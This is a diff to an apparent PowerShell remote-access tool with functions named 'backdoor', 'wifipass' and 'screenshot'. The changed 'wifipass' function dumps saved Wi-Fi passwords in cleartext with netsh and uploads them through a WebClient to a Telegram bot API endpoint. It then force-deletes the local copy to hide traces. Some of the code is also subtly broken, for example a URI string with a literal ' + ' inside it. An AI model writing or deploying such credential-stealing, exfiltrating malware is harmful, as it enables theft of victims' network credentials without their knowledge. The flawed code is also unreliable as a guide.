@@ -74,17 +74,21 @@ function backdoor {
 
 function wifipass {
     Send-Message "Getting_Passwords.."
-    $storefile = [system.io.directory]::CreateDirectory(“C:\Temp\test”)
+    [system.io.directory]::CreateDirectory(“C:\Temp\test”)
 
     # Passwords via powershell
     $passwords = netsh wlan export profile folder=C:\Temp\test key=clear
 
-    # Temp password storage
-    $passwordfunction = $storefile + $passwords
-    download $passwordfunction
+    $uploadPath = "C:\Temp\test"
+    $uri = "https://api.telegram.org/bot + $BotToken"
 
+    # Downloading test file to telegram
+    $wc = New-Object System.Net.WebClient
+    $resp = $wc.UploadFile($uri,$uploadPath)
+
+    # Deletes the file
     Send-Message "Deleting_Passwords.."
-    Remove-Item C:\Temp\test
+    Remove-Item $uploadPath -Force
 }
 
 function screenshot {
